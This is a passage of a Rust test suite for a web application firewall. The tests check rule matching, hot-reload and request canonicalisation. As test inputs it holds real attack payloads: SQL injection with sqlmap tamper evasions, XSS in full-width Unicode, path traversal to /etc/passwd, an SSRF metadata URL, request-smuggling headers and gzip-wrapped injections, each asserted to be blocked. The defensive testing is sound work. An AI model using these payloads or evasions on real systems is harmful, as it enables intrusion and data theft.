    fn compound_group_matches_on_second_any_of_value() {
        let f = make(
            vec![WafRule {
                id: "admin-mutate".to_string(),
                field: "path".to_string(),
                op: "contains".to_string(),
                value: "/admin".to_string(),
                action: "deny".to_string(),
                all_of: vec![WafAndGroup {
                    field: "method".to_string(),
                    op: "equals".to_string(),
                    any_of: vec!["PUT".to_string(), "DELETE".to_string()],
                }],
                ..Default::default()
            }],
            None,
        );
        let ctx = RequestContext::test_with("1.1.1.1", "/admin/x").with_method("DELETE");
        assert!(matches!(f.check(&ctx), FilterAction::Deny { .. }));
    }

    /// A failed compound rule must not suppress a later, plain rule that
    /// matches the SAME field/bucket. Rule 0 (compound) shares the
    /// `contains`/`path` bucket with rule 1 (plain). Rule 0's group fails;
    /// rule 1 must still fire.
    #[test]
    fn failed_compound_rule_does_not_suppress_later_rule() {
        let f = make(
            vec![
                WafRule {
                    id: "compound-miss".to_string(),
                    field: "path".to_string(),
                    op: "contains".to_string(),
                    value: "/admin".to_string(),
                    action: "deny".to_string(),
                    all_of: vec![WafAndGroup {
                        field: "method".to_string(),
                        op: "equals".to_string(),
                        any_of: vec!["POST".to_string()],
                    }],
                    ..Default::default()
                },
                WafRule {
                    id: "plain-hit".to_string(),
                    field: "path".to_string(),
                    op: "contains".to_string(),
                    value: "/admin".to_string(),
                    action: "deny".to_string(),
                    ..Default::default()
                },
            ],
            None,
        );
        // GET → compound rule's method group fails, but the plain rule
        // (no all_of) on the same bucket must still match.
        let ctx = RequestContext::test_with("1.1.1.1", "/admin/dashboard");
        match f.check(&ctx) {
            FilterAction::Deny { reason, .. } => {
                assert!(reason.contains("plain-hit"), "got {reason}");
            }
            other => panic!("expected Deny from plain-hit, got {other:?}"),
        }
    }

    /// (d) A legacy rule with empty `all_of` behaves exactly as before:
    /// the primary match alone blocks, regardless of method.
    #[test]
    fn legacy_empty_all_of_rule_unchanged() {
        let f = make(
            vec![WafRule {
                id: "legacy".to_string(),
                field: "path".to_string(),
                op: "contains".to_string(),
                value: "/wp-admin".to_string(),
                action: "deny".to_string(),
                // all_of defaults to empty via ..Default::default()
                ..Default::default()
            }],
            None,
        );
        // Plain GET still blocks — no compound gating.
        let ctx = RequestContext::test_with("1.1.1.1", "/wp-admin/login.php");
        match f.check(&ctx) {
            FilterAction::Deny { reason, .. } => {
                assert!(reason.contains("legacy"), "got {reason}");
            }
            other => panic!("expected Deny, got {other:?}"),
        }
    }

    #[test]
    fn compiled_plan_first_rule_wins_with_overlapping_contains() {
        // Two rules on the same field with overlapping patterns;
        // expect the rule with the earlier declaration to win,
        // mirroring the pre-V95 sequential-loop semantics.
        let f = make(
            vec![
                WafRule {
                    id: "first".to_string(),
                    field: "path".to_string(),
                    op: "contains".to_string(),
                    value: "/admin".to_string(),
                    action: "deny".to_string(),
                    ..Default::default()
                },
                WafRule {
                    id: "second".to_string(),
                    field: "path".to_string(),
                    op: "contains".to_string(),
                    value: "/admin/users".to_string(),
                    action: "challenge".to_string(),
                    ..Default::default()
                },
            ],
            None,
        );
        let ctx = RequestContext::test_with("1.1.1.1", "/admin/users/list");
        match f.check(&ctx) {
            FilterAction::Deny { reason, .. } => {
                assert!(
                    reason.contains("first"),
                    "expected first-declared rule to win, got {reason}"
                );
            }
            other => panic!("expected Deny, got {other:?}"),
        }
    }

    #[test]
    fn compiled_plan_mixed_ops_across_fields() {
        // contains on path + equals on method + starts_with on user_agent.
        // Each kind hits — confirm the EARLIEST declared one wins.
        let f = make(
            vec![
                WafRule {
                    id: "ua-blocked".to_string(),
                    field: "user_agent".to_string(),
                    op: "starts_with".to_string(),
                    value: "bad-bot".to_string(),
                    action: "deny".to_string(),
                    ..Default::default()
                },
                WafRule {
                    id: "method-blocked".to_string(),
                    field: "method".to_string(),
                    op: "equals".to_string(),
                    value: "post".to_string(),
                    action: "deny".to_string(),
                    ..Default::default()
                },
                WafRule {
                    id: "path-blocked".to_string(),
                    field: "path".to_string(),
                    op: "contains".to_string(),
                    value: "/wp-admin".to_string(),
                    action: "deny".to_string(),
                    ..Default::default()
                },
            ],
            None,
        );
        let ctx = RequestContext::test_with("1.1.1.1", "/wp-admin/x")
            .with_method("POST")
            .with_ua("bad-bot/1.0");
        match f.check(&ctx) {
            FilterAction::Deny { reason, .. } => {
                assert!(
                    reason.contains("ua-blocked"),
                    "expected first-declared rule to win, got {reason}"
                );
            }
            other => panic!("expected Deny, got {other:?}"),
        }
    }

    /// V96 — microbench harness for the compiled rule plan. Ignored
    /// by default; opt-in via:
    ///
    /// ```sh
    /// cargo test --release --features pingora --lib \
    ///   waf::tests::microbench_compiled_plan -- --ignored --nocapture
    /// ```
    ///
    /// Builds two workloads (matching + non-matching), runs N iterations
    /// of `check()` each, and prints requests/sec. Lets us quantify the
    /// V95 win without pulling in criterion as a dep. CI-friendly: the
    /// test is `#[ignore]` so default runs skip it.
    #[test]
    #[ignore]
    fn microbench_compiled_plan() {
        use std::time::Instant;
        // 200 contains rules on `path` — realistic for a tuned WAF.
        let mut rules: Vec<WafRule> = (0..200)
            .map(|i| WafRule {
                id: format!("r{i}"),
                field: "path".to_string(),
                op: "contains".to_string(),
                value: format!("/banned-pattern-{i:03}"),
                action: "deny".to_string(),
                ..Default::default()
            })
            .collect();
        // + 50 equals on method
        rules.extend((0..50).map(|i| WafRule {
            id: format!("m{i}"),
            field: "method".to_string(),
            op: "equals".to_string(),
            value: format!("custom{i}"),
            action: "deny".to_string(),
            ..Default::default()
        }));
        let f = make(rules, None);
        let ctx_miss = RequestContext::test_with("1.1.1.1", "/normal/clean/path/no/match");
        let ctx_hit = RequestContext::test_with("1.1.1.1", "/banned-pattern-150/x");
        const N: usize = 200_000;
        // Warm-up
        for _ in 0..1_000 {
            let _ = f.check(&ctx_miss);
            let _ = f.check(&ctx_hit);
        }
        let t = Instant::now();
        for _ in 0..N {
            let _ = f.check(&ctx_miss);
        }
        let miss_ns_per = t.elapsed().as_nanos() as f64 / N as f64;
        let t = Instant::now();
        for _ in 0..N {
            let _ = f.check(&ctx_hit);
        }
        let hit_ns_per = t.elapsed().as_nanos() as f64 / N as f64;
        println!(
            "\n=== V96 microbench (250 rules, compiled plan) ===\n\
             miss path: {miss_ns_per:>7.1} ns/req  ({:>8.0} req/s)\n\
             hit  path: {hit_ns_per:>7.1} ns/req  ({:>8.0} req/s)\n",
            1e9 / miss_ns_per,
            1e9 / hit_ns_per,
        );
    }

    #[test]
    fn custom_rule_challenge_action() {
        let f = make(
            vec![WafRule {
                id: "scrutinize".to_string(),
                field: "user_agent".to_string(),
                op: "contains".to_string(),
                value: "scanner".to_string(),
                action: "challenge".to_string(),
                ..Default::default()
            }],
            None,
        );
        let ctx = RequestContext::test_with("1.1.1.1", "/").with_ua("Mozilla/5.0 ScannerBot");
        assert!(matches!(f.check(&ctx), FilterAction::Challenge { .. }));
    }

    #[test]
    fn body_size_limit_enforced() {
        let f = make(vec![], Some(10));
        let body = vec![b'a'; 20];
        match f.inspect_body(&body) {
            Some(FilterAction::Deny { status, .. }) => assert_eq!(status, 413),
            other => panic!("expected 413, got {other:?}"),
        }
    }

    #[test]
    fn body_signature_blocked() {
        let f = make(vec![], None);
        let body = b"name=admin&password=' UNION SELECT * FROM users--";
        assert!(matches!(
            f.inspect_body(body),
            Some(FilterAction::Deny { .. })
        ));
    }

    #[test]
    fn rule_file_loaded_and_applied() {
        let dir = std::env::temp_dir();
        let path = dir.join(format!("aegis-waf-rules-{}.toml", std::process::id()));
        std::fs::write(
            &path,
            r#"
[[rules]]
id = "block-debug"
field = "path"
op = "starts_with"
value = "/debug"
action = "deny"
"#,
        )
        .unwrap();
        let cfg = WafConfig {
            enabled: true,
            rule_files: vec![path.to_string_lossy().to_string()],
            ..Default::default()
        };
        let f = WafFilter::new(&cfg);
        let ctx = RequestContext::test_with("1.1.1.1", "/debug/admin");
        assert!(matches!(f.check(&ctx), FilterAction::Deny { .. }));
        std::fs::remove_file(&path).ok();
    }

    #[test]
    fn waf_hot_reload_picks_up_file_changes() {
        // V19.3 test — write rule file, observe initial rule applied,
        // then rewrite with different rule + verify maybe_reload_rules
        // swaps in new rules atomically.
        let dir = std::env::temp_dir();
        let path = dir.join(format!(
            "aegis-waf-reload-{}-{:?}.toml",
            std::process::id(),
            std::thread::current().id()
        ));
        std::fs::write(
            &path,
            r#"
[[rules]]
id = "v1-block-debug"
field = "path"
op = "starts_with"
value = "/v1-path"
action = "deny"
"#,
        )
        .unwrap();
        let cfg = WafConfig {
            enabled: true,
            rule_files: vec![path.to_string_lossy().to_string()],
            ..Default::default()
        };
        let f = WafFilter::new(&cfg);
        assert_eq!(f.rule_count(), 1);

        // Initial rule fires
        let ctx_v1 = RequestContext::test_with("1.1.1.1", "/v1-path/x");
        assert!(matches!(f.check(&ctx_v1), FilterAction::Deny { .. }));

        // Wait for mtime granularity (some filesystems are 1s resolution)
        std::thread::sleep(std::time::Duration::from_millis(1100));

        // Rewrite with a different rule
        std::fs::write(
            &path,
            r#"
[[rules]]
id = "v2-block-other"
field = "path"
op = "starts_with"
value = "/v2-other"
action = "deny"
"#,
        )
        .unwrap();

        // Trigger reload — should detect mtime change
        let n = f.maybe_reload_rules();
        assert_eq!(n, 1, "exactly one file changed");
        assert_eq!(f.rule_count(), 1);

        // Old rule no longer fires
        assert!(matches!(f.check(&ctx_v1), FilterAction::Allow));
        // New rule fires
        let ctx_v2 = RequestContext::test_with("1.1.1.1", "/v2-other/x");
        assert!(matches!(f.check(&ctx_v2), FilterAction::Deny { .. }));

        // Second reload with no change → 0
        assert_eq!(f.maybe_reload_rules(), 0);

        std::fs::remove_file(&path).ok();
    }

    #[test]
    fn disabled_signature_category_is_skipped() {
        let cfg = WafConfig {
            enabled: true,
            disable_signatures: vec!["sqli".to_string()],
            ..Default::default()
        };
        let f = WafFilter::new(&cfg);
        let ctx = RequestContext::test_with("1.1.1.1", "/?q=1' UNION SELECT * FROM users");
        // sqli disabled — passes
        assert_eq!(f.check(&ctx), FilterAction::Allow);
        // xss still active
        let ctx2 = RequestContext::test_with("1.1.1.1", "/?x=<script>");
        assert!(matches!(f.check(&ctx2), FilterAction::Deny { .. }));
    }

    #[test]
    fn body_within_limit_clean_passes() {
        let f = make(vec![], Some(1024));
        assert!(f.inspect_body(b"hello=world").is_none());
    }

    #[test]
    fn url_encoded_payload_decoded() {
        let f = make(vec![], None);
        // %27 → ' which forms ' or 1=1
        let ctx = RequestContext::test_with("1.1.1.1", "/?q=1%27%20or%201%3D1");
        assert!(matches!(f.check(&ctx), FilterAction::Deny { .. }));
    }

    #[test]
    fn double_encoded_payload_decoded() {
        let f = make(vec![], None);
        // %2527 → %27 → ' → forms ' or '1'='1
        let ctx = RequestContext::test_with("1.1.1.1", "/?q=%2527%20or%20%25271%2527%3D%25271");
        assert!(matches!(f.check(&ctx), FilterAction::Deny { .. }));
    }

    // ── V118: sqlmap tamper coverage ────────────────────────────
    //
    // Each test simulates ONE sqlmap tamper applied to the same base
    // payload (`union select 1,2,3 from users`). Expected outcome:
    // built-in SQLi signature catches the normalised form.

    #[test]
    fn sqlmap_space2comment_caught() {
        // tamper: replace spaces with /**/ between keywords.
        let f = make(vec![], None);
        let ctx =
            RequestContext::test_with("1.1.1.1", "/?q=union/**/select/**/1,2,3/**/from/**/users");
        assert!(matches!(f.check(&ctx), FilterAction::Deny { .. }));
    }

    #[test]
    fn sqlmap_space2morecomments_caught() {
        // Multiple /**/ injected.
        let f = make(vec![], None);
        let ctx = RequestContext::test_with("1.1.1.1", "/?q=union/**//**/select/**//**/1,2,3");
        assert!(matches!(f.check(&ctx), FilterAction::Deny { .. }));
    }

    #[test]
    fn sqlmap_backticks_caught() {
        // tamper: wrap keywords in backticks (MySQL).
        let f = make(vec![], None);
        let ctx = RequestContext::test_with("1.1.1.1", "/?q=`union`+`select`+1,2,3");
        assert!(matches!(f.check(&ctx), FilterAction::Deny { .. }));
    }

    #[test]
    fn sqlmap_appendnullbyte_caught() {
        // tamper: append %00 to end of payload.
        let f = make(vec![], None);
        let ctx = RequestContext::test_with("1.1.1.1", "/?q=union+select+1,2,3%00");
        assert!(matches!(f.check(&ctx), FilterAction::Deny { .. }));
    }

    #[test]
    fn sqlmap_htmlencode_caught() {
        // tamper: htmlencode payload chars (decimal entities).
        // 'union select' → &#117;&#110;&#105;&#111;&#110; &#115;&#101;...
        let f = make(vec![], None);
        // We test a partial encoding (just first word).
        let ctx = RequestContext::test_with(
            "1.1.1.1",
            "/?q=&#117;&#110;&#105;&#111;&#110;+select+*+from+users",
        );
        assert!(matches!(f.check(&ctx), FilterAction::Deny { .. }));
    }

    #[test]
    fn sqlmap_htmlencode_hex_caught() {
        // tamper: htmlencode payload chars (hex entities).
        // 'union' → &#x75;&#x6e;&#x69;&#x6f;&#x6e;
        let f = make(vec![], None);
        let ctx =
            RequestContext::test_with("1.1.1.1", "/?q=&#x75;&#x6e;&#x69;&#x6f;&#x6e;+select+1");
        assert!(matches!(f.check(&ctx), FilterAction::Deny { .. }));
    }

    #[test]
    fn sqlmap_versionedkeywords_caught() {
        // tamper: wrap keyword in /*!12345KEYWORD*/ (MySQL version-
        // dependent comment that older mysql executes).
        let f = make(vec![], None);
        let ctx =
            RequestContext::test_with("1.1.1.1", "/?q=/*!50000union*/+/*!50000select*/+1,2,3");
        assert!(matches!(f.check(&ctx), FilterAction::Deny { .. }));
    }

    #[test]
    fn sqlmap_space2dash_caught() {
        // tamper: replace spaces with `-- noise\n`.
        let f = make(vec![], None);
        let ctx = RequestContext::test_with("1.1.1.1", "/?q=union--+aegis%0aselect--+x%0a1,2,3");
        assert!(matches!(f.check(&ctx), FilterAction::Deny { .. }));
    }

    #[test]
    fn sqlmap_space2hash_caught() {
        // tamper: replace spaces with `%23 noise %0a` (MySQL line comment).
        let f = make(vec![], None);
        let ctx = RequestContext::test_with("1.1.1.1", "/?q=union%23x%0aselect%23y%0a1,2,3");
        assert!(matches!(f.check(&ctx), FilterAction::Deny { .. }));
    }

    #[test]
    fn sqlmap_multipletampers_combined_caught() {
        // The strongest test: chain space2comment + backticks +
        // htmlencode in one payload (sqlmap's --tamper supports
        // comma-separated chain).
        let f = make(vec![], None);
        let ctx = RequestContext::test_with(
            "1.1.1.1",
            "/?q=`&#x75;&#x6e;&#x69;&#x6f;&#x6e;`/**/`select`/**/1,2,3",
        );
        assert!(matches!(f.check(&ctx), FilterAction::Deny { .. }));
    }

    #[test]
    fn html_numeric_decoder_handles_decimal_and_hex() {
        assert_eq!(decode_html_numeric_entities("&#65;&#x42;"), "AB");
        // Invalid → pass through unchanged.
        assert_eq!(decode_html_numeric_entities("&#nothex;"), "&#nothex;");
        assert_eq!(decode_html_numeric_entities("&# 65;"), "&# 65;");
        // Mixed in clean text.
        assert_eq!(
            decode_html_numeric_entities("hello &#x41;&#x42;C"),
            "hello ABC"
        );
    }

    #[test]
    fn mysql_versioned_comment_evasion_caught() {
        let f = make(vec![], None);
        let ctx = RequestContext::test_with("1.1.1.1", "/?q=/*!UNION*/+SELECT+1");
        assert!(matches!(f.check(&ctx), FilterAction::Deny { .. }));
    }

    #[test]
    fn cl_te_smuggling_blocked() {
        let f = full_default();
        let ctx = RequestContext::test_with("1.1.1.1", "/")
            .with_header("content-length", "10")
            .with_header("transfer-encoding", "chunked");
        match f.check(&ctx) {
            FilterAction::Deny { status, reason } => {
                assert_eq!(status, 400);
                assert!(reason.contains("smuggling"));
            }
            other => panic!("expected smuggling deny, got {other:?}"),
        }
    }

    #[test]
    fn unknown_transfer_encoding_blocked() {
        let f = full_default();
        let ctx = RequestContext::test_with("1.1.1.1", "/")
            .with_header("transfer-encoding", "evil-encoding");
        assert!(matches!(
            f.check(&ctx),
            FilterAction::Deny { status: 400, .. }
        ));
    }

    #[test]
    fn method_not_in_allowlist_blocked() {
        let f = full_default();
        let mut ctx = RequestContext::test_with("1.1.1.1", "/");
        ctx.method = hyper::Method::TRACE;
        match f.check(&ctx) {
            FilterAction::Deny { status, .. } => assert_eq!(status, 405),
            other => panic!("expected 405, got {other:?}"),
        }
    }

    #[test]
    fn large_header_value_rejected() {
        let mut cfg = WafConfig {
            enabled: true,
            ..Default::default()
        };
        cfg.max_header_value_bytes = 64;
        let f = WafFilter::new(&cfg);
        let big = "x".repeat(128);
        let ctx = RequestContext::test_with("1.1.1.1", "/").with_header("x-big", &big);
        match f.check(&ctx) {
            FilterAction::Deny { status, .. } => assert_eq!(status, 431),
            other => panic!("expected 431, got {other:?}"),
        }
    }

    #[test]
    fn long_uri_rejected() {
        let mut cfg = WafConfig {
            enabled: true,
            ..Default::default()
        };
        cfg.max_uri_bytes = 32;
        let f = WafFilter::new(&cfg);
        let big = "/".to_string() + &"a".repeat(64);
        let ctx = RequestContext::test_with("1.1.1.1", &big);
        match f.check(&ctx) {
            FilterAction::Deny { status, .. } => assert_eq!(status, 414),
            other => panic!("expected 414, got {other:?}"),
        }
    }

    #[test]
    fn path_traversal_signature_blocked() {
        let f = make(vec![], None);
        let ctx = RequestContext::test_with("1.1.1.1", "/files?p=../../etc/passwd");
        assert!(matches!(f.check(&ctx), FilterAction::Deny { .. }));
    }

    #[test]
    fn ssrf_metadata_url_blocked_in_query() {
        let f = make(vec![], None);
        let ctx = RequestContext::test_with(
            "1.1.1.1",
            "/fetch?url=http://169.254.169.254/latest/meta-data/",
        );
        assert!(matches!(f.check(&ctx), FilterAction::Deny { .. }));
    }

    #[test]
    fn time_based_sqli_caught() {
        let f = make(vec![], None);
        let ctx = RequestContext::test_with("1.1.1.1", "/?id=1;WAITFOR+DELAY+'00:00:10'--");
        assert!(matches!(f.check(&ctx), FilterAction::Deny { .. }));
    }

    #[test]
    fn cookie_field_rule_matches() {
        let f = make(
            vec![WafRule {
                id: "session-block".to_string(),
                field: "cookie:sessionid".to_string(),
                op: "equals".to_string(),
                value: "evil".to_string(),
                action: "deny".to_string(),
                ..Default::default()
            }],
            None,
        );
        let ctx = RequestContext::test_with("1.1.1.1", "/")
            .with_header("cookie", "other=1; sessionid=evil; foo=bar");
        assert!(matches!(f.check(&ctx), FilterAction::Deny { .. }));
    }

    #[test]
    fn content_length_gt_rule_matches() {
        let f = make(
            vec![WafRule {
                id: "big-upload".to_string(),
                field: "content_length".to_string(),
                op: "gt".to_string(),
                value: "1024".to_string(),
                action: "deny".to_string(),
                ..Default::default()
            }],
            Some(usize::MAX),
        );
        let ctx = RequestContext::test_with("1.1.1.1", "/").with_header("content-length", "4096");
        assert!(matches!(f.check(&ctx), FilterAction::Deny { .. }));
    }

    #[test]
    fn crlf_injection_in_rule_id_neutralised() {
        let f = make(
            vec![WafRule {
                id: "nasty\r\nSet-Cookie: pwn=1".to_string(),
                field: "path".to_string(),
                op: "equals".to_string(),
                value: "/x".to_string(),
                action: "deny".to_string(),
                ..Default::default()
            }],
            None,
        );
        let ctx = RequestContext::test_with("1.1.1.1", "/x");
        match f.check(&ctx) {
            FilterAction::Deny { reason, .. } => {
                assert!(!reason.contains('\n'));
                assert!(!reason.contains('\r'));
            }
            _ => panic!("expected deny"),
        }
    }

    // ── V233: security remediation regression tests ─────────────────

    /// V233 — BUG 1 (panic_crash). A `/` (or its encoded forms `%2f`,
    /// `\x2f`) immediately followed by a multi-byte UTF-8 character
    /// used to land `canon_once`'s byte cursor inside that character,
    /// and the subsequent `&s[i..]` `&str` slice panicked with
    /// "byte index N is not a char boundary" — a SIGABRT remote crash
    /// on a `panic = "abort"` release build. `canon()` must now return
    /// normally for every such input.
    #[test]
    fn canon_slash_then_multibyte_does_not_panic() {
        // Each string places a slash-substitution immediately before a
        // multi-byte char so the post-substitution cursor falls
        // mid-codepoint under the old `&str`-indexing implementation.
        let cases = [
            // literal '/' + 2-byte char; the trailing '+' forces the
            // substitution loop to run so the '/' is processed there.
            "/é+",
            "%2fé",                   // %2f → '/' (+3), then 2-byte char
            "\\x2fé",                 // \x2f → '/' (+4), then 2-byte char
            "\\u002fé",               // / → '/' (+6), then 2-byte char
            "%2f你好世界",            // 3-byte CJK chars after %2f
            "%2f\u{1F4A9}",           // 4-byte emoji after %2f
            "a%2fé%2f界%2f\u{1F600}", // alternating substitutions + multibyte
            "%2f%2fé",                // back-to-back substitutions then multibyte
        ];
        for c in cases {
            // The bug manifested as a panic; reaching the assert at all
            // means no panic occurred.
            let out = canon(c);
            assert!(!out.as_ref().is_empty(), "canon({c:?}) returned empty");
        }
        // Slashes must still be normalised: every encoded form collapses
        // to a literal '/', and the trailing multi-byte char survives.
        assert_eq!(canon("%2fé").as_ref(), "/é");
        assert_eq!(canon("\\x2fé").as_ref(), "/é");
        assert_eq!(canon("\\u002fé").as_ref(), "/é");
        // Valid-input canonicalisation is unchanged (ASCII regression).
        assert_eq!(canon("%2fadmin").as_ref(), "/admin");
        assert_eq!(canon("a%2fb%2fc").as_ref(), "a/b/c");
    }

    /// V233 — BUG 2 (auth_bypass). A signature placed past the old
    /// fixed 256 KiB scan window — but within the operator-configured
    /// `max_body_bytes` ceiling — used to be forwarded upstream
    /// unscanned. `inspect_body` must now scan the whole accepted body.
    #[test]
    fn body_signature_past_256kib_still_blocked() {
        // max_body_bytes large enough to accept a >256 KiB body.
        let f = make(vec![], Some(2 * 1024 * 1024));
        let mut body = vec![b'a'; 300 * 1024]; // 300 KiB of filler
        // Embed an SQLi signature well past the old 256 KiB cutoff.
        body.extend_from_slice(b" union select * from users ");
        assert!(body.len() > 256 * 1024);
        match f.inspect_body(&body) {
            Some(FilterAction::Deny { status, reason }) => {
                assert_eq!(status, 403);
                assert!(reason.contains("sqli"), "unexpected reason: {reason}");
            }
            other => panic!("expected 403 sqli deny for payload past 256 KiB, got {other:?}"),
        }
    }

    /// V233 — BUG 3 (auth_bypass). When the accepted body slice ended
    /// mid-codepoint (or carried raw binary), `std::str::from_utf8`
    /// returned `Err` and the ENTIRE body scan was silently skipped.
    /// Lossy decoding must keep the scan running so a signature in the
    /// valid prefix is still caught.
    #[test]
    fn body_signature_blocked_with_invalid_utf8_tail() {
        let f = make(vec![], Some(1024 * 1024));
        let mut body: Vec<u8> = Vec::new();
        body.extend_from_slice(b"name=x&q=' union select * from users--");
        // Truncated multi-byte sequence: lead byte of a 3-byte char
        // with no continuation bytes — makes the whole buffer invalid
        // UTF-8 so the old `from_utf8` bailed.
        body.push(0xE4);
        body.push(0xB8);
        // Also append a stray raw binary byte for good measure.
        body.push(0xFF);
        assert!(std::str::from_utf8(&body).is_err());
        match f.inspect_body(&body) {
            Some(FilterAction::Deny { status, reason }) => {
                assert_eq!(status, 403);
                assert!(reason.contains("sqli"), "unexpected reason: {reason}");
            }
            other => panic!("expected 403 sqli deny despite invalid-UTF-8 body, got {other:?}"),
        }
    }

    /// V233 — BUG 4 (auth_bypass). An inline `/* ... */` comment (with
    /// arbitrary content) inserted between SQL keywords — sqlmap's
    /// space2comment family — used to survive when only the
    /// `/*!`-versioned form was collapsed. `canon` must collapse ANY
    /// `/* ... */` span to a single space so the `union select`
    /// signature still fires.
    #[test]
    fn canon_inline_comment_collapses_to_space() {
        // Bare /**/ and a comment carrying noise content both collapse.
        assert_eq!(canon("union/**/select").as_ref(), "union select");
        assert_eq!(canon("union/*aegis-noise*/select").as_ref(), "union select");
        // Unterminated comment still collapses (defensive).
        assert_eq!(canon("union/*dangling").as_ref(), "union ");
    }

    /// V233 — BUG 4 end-to-end: an inline-comment-obfuscated SQLi
    /// payload must be denied by the built-in `union select` signature
    /// after canonicalisation collapses the comments. `/* ... */` is
    /// whitespace to MySQL's lexer, so `union/*x*/select` is a working
    /// injection — collapsing each comment to a single space yields
    /// `union select`, which the signature catches.
    #[test]
    fn inline_comment_sqli_bypass_blocked() {
        let f = make(vec![], None);
        // Inline comments between keywords (the realistic sqlmap
        // space2comment form) — collapsed to spaces, this is
        // `union select 1,2,3 from users`.
        let ctx = RequestContext::test_with(
            "1.1.1.1",
            "/?q=union/*x*/select/*y*/1,2,3/*z*/from/*w*/users",
        );
        assert!(matches!(f.check(&ctx), FilterAction::Deny { .. }));
        // Body-borne variant goes through inspect_body / match_signature.
        let body = b"q=union/*c*/select * from users";
        assert!(matches!(
            f.inspect_body(body),
            Some(FilterAction::Deny { .. })
        ));
    }

    // ── C4 — compressed-body WAF bypass ────────────────────────────────

    fn gzip(data: &[u8]) -> Vec<u8> {
        use std::io::Write;
        let mut enc = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
        enc.write_all(data).expect("gzip write");
        enc.finish().expect("gzip finish")
    }

    fn deflate(data: &[u8]) -> Vec<u8> {
        use std::io::Write;
        let mut enc = flate2::write::ZlibEncoder::new(Vec::new(), flate2::Compression::default());
        enc.write_all(data).expect("deflate write");
        enc.finish().expect("deflate finish")
    }

    /// C4 — a gzip-compressed SQLi body sailed past the WAF before the
    /// fix because `inspect_body` scanned the still-compressed bytes.
    /// With decompression it must be caught. The raw compressed bytes
    /// (no encoding declared) must NOT trip a signature, proving the
    /// catch comes from decompression and not from coincidental bytes.
    #[test]
    fn gzip_body_sqli_bypass_blocked() {
        let f = make(vec![], Some(1024 * 1024));
        let payload = b"q=' union select * from users--";
        let compressed = gzip(payload);

        // Sanity: compressed bytes alone (treated as identity) don't match.
        assert!(
            f.inspect_body_with_encoding(&compressed, None).is_none(),
            "compressed bytes should be opaque without decompression"
        );

        // With Content-Encoding: gzip we decompress and catch the SQLi.
        match f.inspect_body_with_encoding(&compressed, Some("gzip")) {
            Some(FilterAction::Deny { status, reason }) => {
                assert_eq!(status, 403);
                assert!(reason.contains("sqli"), "unexpected reason: {reason}");
            }
            other => panic!("expected 403 sqli deny for gzip body, got {other:?}"),
        }
    }

    /// C4 — deflate path catches the same payload (zlib-wrapped form).
    #[test]
    fn deflate_body_sqli_bypass_blocked() {
        let f = make(vec![], Some(1024 * 1024));
        let compressed = deflate(b"x=<script>alert(1)</script>");
        assert!(matches!(
            f.inspect_body_with_encoding(&compressed, Some("deflate")),
            Some(FilterAction::Deny { status: 403, .. })
        ));
    }

    /// C4 — a benign gzip body must still pass after decompression.
    #[test]
    fn gzip_benign_body_allowed() {
        let f = make(vec![], Some(1024 * 1024));
        let compressed = gzip(b"name=alice&city=portland");
        assert!(
            f.inspect_body_with_encoding(&compressed, Some("gzip"))
                .is_none()
        );
    }

    /// C4 — unsupported / unknown encodings FAIL CLOSED. `br` is the
    /// canonical case (we deliberately do NOT ship a brotli decoder);
    /// stacked encodings are equally uninspectable.
    #[test]
    fn unsupported_encoding_fails_closed() {
        let f = make(vec![], Some(1024 * 1024));
        let body = b"anything";
        for enc in ["br", "compress", "zstd", "gzip, gzip", "gzip, br"] {
            match f.inspect_body_with_encoding(body, Some(enc)) {
                Some(FilterAction::Deny { status, .. }) => assert_eq!(status, 415, "enc={enc}"),
                other => panic!("expected fail-closed deny for `{enc}`, got {other:?}"),
            }
        }
    }

    /// C4 — `identity` (and a list containing only identity) is a no-op
    /// and must scan the raw bytes normally.
    #[test]
    fn identity_encoding_scans_raw() {
        let f = make(vec![], Some(1024 * 1024));
        let body = b"q=' union select * from users--";
        assert!(matches!(
            f.inspect_body_with_encoding(body, Some("identity")),
            Some(FilterAction::Deny { status: 403, .. })
        ));
    }

    /// C4 — a decompression bomb (tiny input, huge output) must be
    /// rejected by the ratio/size bound rather than expanded into memory.
    #[test]
    fn gzip_decompression_bomb_rejected() {
        // ratio cap = 100 (test default in `make` → WafConfig default).
        let f = make(vec![], Some(1024 * 1024));
        // 1 MiB of zeros compresses to a few hundred bytes → ratio far
        // above the 100× cap.
        let huge = vec![0u8; 1024 * 1024];
        let compressed = gzip(&huge);
        assert!(
            (compressed.len() as u64) * 100 < huge.len() as u64,
            "test premise: ratio must exceed the 100x cap"
        );
        match f.inspect_body_with_encoding(&compressed, Some("gzip")) {
            Some(FilterAction::Deny { status, reason }) => {
                assert_eq!(status, 400);
                assert!(reason.contains("limit"), "unexpected reason: {reason}");
            }
            other => panic!("expected bomb rejection, got {other:?}"),
        }
    }

    /// C4 — a malformed "gzip" body (declared gzip, garbage bytes) fails
    /// closed rather than being forwarded uninspected.
    #[test]
    fn malformed_gzip_fails_closed() {
        let f = make(vec![], Some(1024 * 1024));
        let garbage = b"\x1f\x8b not actually gzip data at all";
        assert!(matches!(
            f.inspect_body_with_encoding(garbage, Some("gzip")),
            Some(FilterAction::Deny { status: 400, .. })
        ));
    }

    // ── H4 — full-width / confusable Unicode evasion ───────────────────

    /// H4 — a full-width `＜script＞` (U+FF1C / U+FF1E) used to evade the
    /// `<script` signature because `canon` only folded ASCII. With NFKC
    /// folding in the slow path it canonicalises to `<script>` and the
    /// XSS signature fires.
    #[test]
    fn fullwidth_script_evasion_caught() {
        // canon() must fold the full-width brackets to ASCII `<`/`>`.
        let folded = canon("\u{FF1C}script\u{FF1E}");
        assert!(
            folded.as_ref().contains("<script"),
            "fullwidth not folded: {folded}"
        );

        // End-to-end through the signature scan.
        let f = make(vec![], None);
        let ctx = RequestContext::test_with(
            "1.1.1.1",
            "/p?x=\u{FF1C}script\u{FF1E}alert(1)\u{FF1C}/script\u{FF1E}",
        );
        assert!(
            matches!(f.check(&ctx), FilterAction::Deny { .. }),
            "full-width <script> evasion not blocked"
        );
    }

    /// H4 — confusable angle brackets (U+2039 `‹` / U+203A `›`) also fold
    /// to ASCII `<`/`>` via the normaliser's confusable table.
    #[test]
    fn confusable_bracket_evasion_caught() {
        let folded = canon("\u{2039}script\u{203A}");
        assert!(
            folded.as_ref().contains("<script"),
            "confusable not folded: {folded}"
        );
    }

    /// H4 — the pure-ASCII hot path must remain a zero-alloc borrow; the
    /// Unicode-folding addition is strictly gated behind the non-ASCII
    /// bail and must not perturb clean ASCII input.
    #[test]
    fn ascii_hot_path_unaffected_by_unicode_fold() {
